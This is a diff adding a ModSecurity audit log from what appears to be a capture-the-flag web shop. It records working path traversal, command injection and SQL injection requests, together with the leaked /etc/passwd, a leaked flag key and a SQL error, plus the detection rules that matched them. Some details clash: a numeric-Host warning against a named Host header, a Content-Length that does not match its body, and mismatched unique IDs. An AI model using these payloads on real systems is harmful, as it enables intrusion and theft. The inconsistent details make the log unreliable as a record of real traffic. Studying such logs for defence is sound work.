@@ -1,0 +1,138 @@
+--a71b3f02-A--
+[16/Oct/2026:02:14:31.220415 +0700] Zxa71b3f02AQAAABA 45.9.148.23 40122 10.0.2.15 80
+--a71b3f02-B--
+GET /gallery.php?img=..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
+Host: shop2.example.id
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+--a71b3f02-F--
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+
+--a71b3f02-E--
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+--a71b3f02-H--
+
+Message: Warning. Pattern match "(?:%(?:c0%(?:[2aq]f|5c|9v)|2f|5c))" at REQUEST_URI_RAW. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "47"] [id "930100"] [msg "Path Traversal Attack (/..)"] [data "Matched Data: %2F..%2F found within REQUEST_URI_RAW: /gallery.php?img=..%2F..%2F..%2F..%2Fetc%2Fpasswd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "attack-lfi"]
+Apache-Error: [file "apache2_util.c"] [line 271] [level 3] [client 45.9.148.23] ModSecurity: Warning. Pattern match "(?:^|[\/])\.\.(?:[\/]|$)" at REQUEST_URI. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "71"] [id "930110"] [msg "Path Traversal Attack (/..)"] [data "Matched Data: /.. found within REQUEST_URI: /gallery.php?img=../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "attack-lfi"] [hostname "shop2.example.id"] [uri "/gallery.php"] [unique_id "Za71b3f02AQAAABA"]
+Apache-Handler: application/x-httpd-php
+Stopwatch: 1794500000000000 4122 (- - -)
+Producer: ModSecurity for Apache/2.9.5 (http://www.modsecurity.org/); OWASP_CRS/3.3.2.
+Server: Apache/2.4.52 (Ubuntu)
+Engine-Mode: "DETECTION_ONLY"
+
+--a71b3f02-Z--
+
+--b92c4e17-A--
+[16/Oct/2026:02:19:04.556001 +0700] Zxb92c4e17AQAAABA 45.9.148.23 40198 10.0.2.15 80
+--b92c4e17-B--
+POST /api/ping.php HTTP/1.1
+Host: shop2.example.id
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 58
+Referer: https://shop2.example.id/api/ping.php
+Origin: https://shop2.example.id
+
+--b92c4e17-C--
+host=127.0.0.1%3Bcat+%2Fvar%2Fwww%2Fkeys%2Fupgrade_key.txt
+--b92c4e17-F--
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+
+--b92c4e17-E--
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.031 ms
+
+=== UPGRADE KEY (do not share) ===
+ctf{d3t3ct10n_0nly_n0_bl0ck}
+=== valid until 2027-01-01 ===
+--b92c4e17-H--
+
+Message: Warning. Matched phrase "cat " at ARGS:host. [file "/usr/share/modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "490"] [id "932150"] [msg "Remote Command Execution: Unix Command Injection"] [data "Matched Data: cat found within ARGS:host: 127.0.0.1;cat /var/www/keys/upgrade_key.txt"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "attack-rce"]
+Apache-Error: [file "apache2_util.c"] [line 271] [level 3] [client 45.9.148.23] ModSecurity: Warning. Operator GE matched 5 at TX:inbound_anomaly_score. [file "/usr/share/modsecurity-crs/rules/RESPONSE-980-CORRELATION.conf"] [line "91"] [id "980130"] [msg "Inbound Anomaly Score Exceeded (Total Inbound Score: 10 - SQLI=0,XSS=0,RFI=0,LFI=0,RCE=10,PHPI=0,HTTP=0,SESS=0): individual paranoia level scores: 10, 0, 0, 0"] [ver "OWASP_CRS/3.3.2"] [tag "event-correlation"] [hostname "shop2.example.id"] [uri "/api/ping.php"] [unique_id "Zb92c4e17AQAAABA"]
+Apache-Handler: application/x-httpd-php
+Stopwatch: 1794500000000000 4122 (- - -)
+Producer: ModSecurity for Apache/2.9.5 (http://www.modsecurity.org/); OWASP_CRS/3.3.2.
+Server: Apache/2.4.52 (Ubuntu)
+Engine-Mode: "DETECTION_ONLY"
+
+--b92c4e17-Z--
+
+--c53d5a29-A--
+[16/Oct/2026:02:23:47.904512 +0700] Zxc53d5a29AQAAABA 45.9.148.23 40233 10.0.2.15 80
+--c53d5a29-B--
+POST /login.php HTTP/1.1
+Host: shop2.example.id
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 34
+Referer: https://shop2.example.id/login.php
+Origin: https://shop2.example.id
+
+--c53d5a29-C--
+user=admin%27--&password=x
+--c53d5a29-F--
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+
+--c53d5a29-E--
+<b>Fatal error</b>: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual for your MySQL version for the right syntax to use near '--' AND password = 'x' at line 1 in /var/www/html/login.php:21
+--c53d5a29-H--
+
+Message: Warning. detected SQLi using libinjection with fingerprint 's&1c' [file "/usr/share/modsecurity-crs/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf"] [line "65"] [id "942100"] [msg "SQL Injection Attack Detected via libinjection"] [data "Matched Data: s&1c found within ARGS:user: admin'--"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "attack-sqli"]
+Apache-Handler: application/x-httpd-php
+Stopwatch: 1794500000000000 4122 (- - -)
+Producer: ModSecurity for Apache/2.9.5 (http://www.modsecurity.org/); OWASP_CRS/3.3.2.
+Server: Apache/2.4.52 (Ubuntu)
+Engine-Mode: "DETECTION_ONLY"
+
+--c53d5a29-Z--
+
+--d74e6b31-A--
+[16/Oct/2026:02:25:12.331008 +0700] Zxd74e6b31AQAAABA 203.0.113.20 51402 10.0.2.15 80
+--d74e6b31-B--
+GET / HTTP/1.1
+Host: shop2.example.id
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+--d74e6b31-F--
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+
+--d74e6b31-E--
+<!DOCTYPE html>
+<html><head><title>Example Shop</title></head>
+<body><h1>Welcome to Example Shop</h1></body></html>
+--d74e6b31-H--
+
+Message: Warning. Pattern match "^[\d.:]+$" at REQUEST_HEADERS:Host. [file "/usr/share/modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"] [line "735"] [id "920350"] [msg "Host header is a numeric IP address"] [data "10.0.2.15"] [severity "WARNING"] [ver "OWASP_CRS/3.3.2"] [tag "attack-protocol"]
+Apache-Handler: application/x-httpd-php
+Stopwatch: 1794500000000000 4122 (- - -)
+Producer: ModSecurity for Apache/2.9.5 (http://www.modsecurity.org/); OWASP_CRS/3.3.2.
+Server: Apache/2.4.52 (Ubuntu)
+Engine-Mode: "DETECTION_ONLY"
+
+--d74e6b31-Z--
